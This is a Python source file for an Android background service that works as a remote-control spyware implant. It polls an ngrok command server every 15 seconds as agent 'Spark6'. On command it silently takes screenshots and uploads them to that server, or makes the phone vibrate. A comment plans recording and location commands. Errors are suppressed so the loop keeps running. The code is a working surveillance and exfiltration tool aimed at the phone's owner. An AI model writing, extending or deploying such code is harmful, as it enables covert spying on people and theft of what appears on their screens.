import time, requests, os
from jnius import autoclass

# --- CONFIGURATION ---
URL_BASE = "https://unwomanly-jugate-dorathy.ngrok-free.dev"

# Android Classes for hardware control
PythonService = autoclass('org.kivy.android.PythonService').mService
Context = autoclass('android.content.Context')
Vibrator = PythonService.getSystemService(Context.VIBRATOR_SERVICE)

def execute_vibrate():
    try:
        if Vibrator.hasVibrator():
            Vibrator.vibrate(1000)
    except: pass

def execute_screenshot():
    path = "/sdcard/m_snap.png"
    try:
        os.system(f"screencap -p {path}")
        if os.path.exists(path):
            with open(path, 'rb') as f:
                # Long timeout for slow uploads in 3G
                requests.post(f"{URL_BASE}/upload_file", 
                             files={'file': (f'snap_{int(time.time())}.png', f)}, 
                             timeout=60)
            os.remove(path)
    except: pass

# --- MAIN LOOP (THE PERSISTENT HEART) ---
while True:
    try:
        # We ask for orders with a robust timeout
        response = requests.post(
            URL_BASE, 
            json={"agent": "Spark6", "status": "ALIVE_IN_BG"}, 
            timeout=25
        )
        
        if response.status_code == 200:
            command = response.json().get("command", "NONE")
            
            if command == "VIBRATE":
                execute_vibrate()
            elif command == "SCREENSHOT":
                execute_screenshot()
            # Add other commands here (RECORD, LOCATION)
            
    except Exception as e:
        # If network fails, we don't crash, we just wait
        print(f"Network suppressed: {e}")
        time.sleep(10) 
        continue

    time.sleep(15) # Pulse every 15 seconds